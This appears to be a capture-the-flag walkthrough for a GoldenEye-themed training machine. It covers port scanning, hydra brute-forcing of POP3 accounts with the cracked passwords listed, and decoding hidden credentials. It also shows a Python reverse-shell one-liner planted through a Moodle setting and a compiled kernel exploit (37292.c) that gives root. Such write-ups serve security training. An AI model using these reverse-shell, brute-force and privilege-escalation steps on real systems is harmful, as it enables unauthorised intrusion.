@@ -1,0 +1,332 @@
+
+Task1:
+------
+
+We can disable reverse DNS lookups to speed up the scan:
+
+nmap <ip> --open -Pn -n -p-
+                      
+		      ^ 
+                      |---- disable rev-DNS lookup
+
+
+I went to the website at http port. It was told on that webpage to go to /sev-home/ directory. I went there, I was prompted with a login page. So, we need a user and a password.
+
+Q. Take a look on the website, take a dive into the source code too and remember to inspect all scripts!
+
+---> I took a look at the opening page source code but couldn't find anything...
+
+But it was told to me to check, I started clicking on every link of the webpage(source-code), terminal.js has got the encoded password of 1 line...
+
+
+Q. Who needs to make sure they update their default password?
+
+----> Usernames are written on that website (2 usernames)
+
+1st starts with ----> B
+2nd starts with ----> N
+
+Q. Whats their password?
+
+---->  But it was told to me to check, I started clicking on every link of the webpage(source-code), terminal.js has got the encoded password of 1 line...
+
+I then decrypted it with ---> HTML to text converter online or it can be done with 
+Burpsuit decoder as well.
+
+
+
+Task2:
+------
+
+I logged in to that website /sev-home/ ---> I saw that pop3 was running, written in taht page.
+
+Q. If those creds don't seem to work, can you use another program to find other users and passwords? Maybe Hydra?Whats their new password?
+
+----> We will use hydra to obtain password on service pop3
+
+But 1st we have to see in which port it is running...
+
+Suspecting port 55006 and 55007, beacause these are the ports, till now we haven't checked the services running on them yet...
+
+nmap -Pn -p 55006,55007 -sV <ip> 
+
+---> 
+PORT      STATE SERVICE     VERSION
+55006/tcp open  ssl/unknown
+55007/tcp open  pop3        Dovecot pop3d 
+
+So, only port 55007...awesome
+
+As We got two username : we will perform brute-force twice:
+
+1. hydra -l boris -P /usr/share/wordlists/fasttrack.txt -t20 10.10.168.149 -s 55007 -I pop3 
+
+
+✓ ✓  Rockyou.txt was taking too much time ✓ ✓
+
+
+[55007][pop3] host: 10.10.168.149   login: boris   password: secret1!
+
+2. hydra -l natalya -P /usr/share/wordlists/rockyou.txt -t20 10.10.168.149 -s 55007 -I pop3
+
+[55007][pop3] host: 10.10.168.149   login: natalya   password: bird
+
+Q. Inspect port 55007, what services is configured to use this port?
+
+----> telnet
+
+Q. What can you find on this service?
+
+--> I logged in with:
+
+1. 
+
+> telnet 10.10.168.149 55007
+
+Trying 10.10.168.149...
+Connected to 10.10.168.149.
+Escape character is '^]'.
++OK GoldenEye POP3 Electronic-Mail System
+> LIST
+-ERR Unknown command.
+> USER boris
++OK
+> PASS secret1!
++OK Logged in.
+> LIST
++OK 3 messages:
+1 544
+2 373
+3 921
+
+--->I havn't got any juicy thing inside it.
+
+2. 
+
+> telnet 10.10.168.149 55007
+
+Trying 10.10.168.149...
+Connected to 10.10.168.149.
+Escape character is '^]'.
++OK GoldenEye POP3 Electronic-Mail System
+> USER natalya
++OK
+> PASS bird
++OK Logged in.
+> LIST
++OK 3 messages:
+1 544
+2 373
+3 921
+
+------> We will use: RETR (Retrieve) to see the email lists
+.
+RETR 1
++OK 631 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from ok (localhost [127.0.0.1])
+	by ubuntu (Postfix) with ESMTP id D5EDA454B1
+	for <natalya>; Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+Message-Id: <20180425024542.D5EDA454B1@ubuntu>
+Date: Tue, 10 Apr 1995 19:45:33 -0700 (PDT)
+From: root@ubuntu
+
+Natalya, please you need to stop breaking boris' codes. Also, you are GNO supervisor for training. I will email you once a student is designated to you.
+
+Also, be cautious of possible network breaches. We have intel that GoldenEye is being sought after by a crime syndicate named Janus.
+.
+RETR 2
++OK 1048 octets
+Return-Path: <root@ubuntu>
+X-Original-To: natalya
+Delivered-To: natalya@ubuntu
+Received: from root (localhost [127.0.0.1])
+	by ubuntu (Postfix) with SMTP id 17C96454B1
+	for <natalya>; Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+Message-Id: <20180425031956.17C96454B1@ubuntu>
+Date: Tue, 29 Apr 1995 20:19:42 -0700 (PDT)
+From: root@ubuntu
+
+Ok Natalyn I have a new student for you. As this is a new system please let me or boris know if you see any config issues, especially is it's related to security...even if it's not, just enter it in under the guise of "security"...it'll get the change order escalated without much hassle :)
+
+Ok, user creds are:
+
+username: xenia
+password: RCP90rulez!
+
+Boris verified her as a valid contractor so just create the account ok?
+
+And if you didn't have the URL on outr internal Domain: severnaya-station.com/gnocertdir
+**Make sure to edit your host file since you usually work remote off-network....
+
+Since you're a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
+
+---> There we go: We got username and password...
+
+
+Task 3:
+-------
+
+Logged in to the website with the new xenia:RCP90rulez! creds.
+
+It said --> You can not enroll yourself in this course.
+
+I also got a message from doak:
+
+Let's use this username and use hydra to bruteforce.
+
+But wait, What will we brute force...??
+
+If you see, in the message carefully:
+
+> If you have any questions message me via email
+
+We will bruteforce pop3...
+
+> hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3://10.10.168.149:55007
+
+OR
+
+> hydra -l doak -P /usr/share/wordlists/fasttrack.txt -t20 10.10.168.149 -s 55007 -I pop3
+
+--> [55007][pop3] host: 10.10.168.149   login: doak   password: goat
+
+We used: telnet with this creds,
+
+We again got creds with which we will again use telnet but now with this user:pass
+
+We got again:
+
+username: dr_doak
+password: 4England!
+
+With this we will login to moodle (severnaya-station.com)
+
+I went to search for files as soon as I logged in...
+
+I went to My profilt > My private files ---> *.txt and downloaded it.
+
+Within this txt file, We got a message:
+
+> Something juicy is located here: /dir007key/for-007.jpg
+
+$ wget http://severnaya-station.com/dir007key/for-007.jpg
+
+Opened the file ----> Acc. to me this should be related to the administrative 
+
+To analyze the metadata of the image:
+
+$ exiftool for-007.jpg
+
+WE got a thing:
+
+> Image Description     : eFdpbnRlcjE5OTV4IQ==
+
+Then:
+2 Equal sign at the end => most probably base64
+
+$ echo eFdpbnRlcjE5OTV4IQ== | base64
+
+-> Got a pass
+
+According to me, this is admin passwd as the image is revealing...
+
+YUPP!!!!! I was right ✓
+
+Now we have to get a shell:
+
+1st lets start a listener:
+
+$ rlwrap nc -nlvp 4444
+
+Now lets start a connector in the trgt:
+
+Search for 'spell' in the search box:
+
+And got the search eangine: ----> changed to PSpellShell
+
+And add: python rev shell:
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+
+Then we would go to Navigation > My profile > Blog > Add a new entry
+
+WE will fill up "Entry title" as well as entry body...
+
+Then add them just...
+
+Then we will get a shell
+
+Q. Kernel Version:
+
+---> uname -r
+
+Q. For exploitation part:
+
+Now download the 37292.c exploit
+
+And then transfer the exploit file from attacker to trgt machine simply by running: python3 -m http.server 8080 on the attacker machine
+
+trgt machine> wget <ip/exploit.c>   ----> To download
+
+Then compile it> gcc exploit.c -o exploit
+
+We will see a error as gcc compiler is not present there in the trgt
+
+$ which gcc
+
+The program 'gcc' is currently not installed. To run 'gcc' please ask your administrator to install the package 'gcc'
+
+
+We will run cc compiler (Basically, Sun C++ compiler)
+
+$ which cc
+/usr/bin/cc
+
+So this is present, we can use it.
+
+But before that we have to make configuration change as the downloaded exploit is meant to be compiled with gcc.
+
+$ sed -i "s/gcc/cc/g" 37292.c
+
+$ cc 37292.c -o exploit
+
+$  ./exploit
+./exploit
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+sh: 0: can't access tty; job control turned off
+# whoami
+
+root
+
+BOOM!!, We got the priv. shell
+
+Q. What is the root flag?
+
+---> 
+$ cd /root 
+$ ls -a
+drwx------  3 root root 4096 Apr 29  2018 .
+drwxr-xr-x 22 root root 4096 Apr 24  2018 ..
+-rw-r--r--  1 root root   19 May  3  2018 .bash_history
+-rw-r--r--  1 root root 3106 Feb 19  2014 .bashrc
+drwx------  2 root root 4096 Apr 28  2018 .cache
+-rw-------  1 root root  144 Apr 29  2018 .flag.txt
+-rw-r--r--  1 root root  140 Feb 19  2014 .profile
+-rw-------  1 root root 1024 Apr 23  2018 .rnd
+-rw-------  1 root root 8296 Apr 29  2018 .viminfo
+
+$ cat .flag.txt
+
+
+There we go!!
+
+This machine is actually OSCP based box...
+
